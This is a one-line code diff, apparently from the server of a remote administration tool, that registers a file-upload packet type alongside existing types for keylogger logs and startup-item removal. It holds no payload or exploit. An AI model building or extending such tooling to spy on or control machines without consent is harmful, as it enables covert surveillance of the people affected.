@@ -150,6 +150,7 @@ namespace xServer.Core.Networking
                 typeof (Packets.ServerPackets.DoStartupItemRemove),
                 typeof (Packets.ServerPackets.DoDownloadFileCancel),
                 typeof (Packets.ServerPackets.GetKeyloggerLogs),
+                typeof (Packets.ServerPackets.DoUploadFile),
                 typeof (Packets.ClientPackets.GetAuthenticationResponse),
                 typeof (Packets.ClientPackets.SetStatus),
                 typeof (Packets.ClientPackets.SetUserStatus),
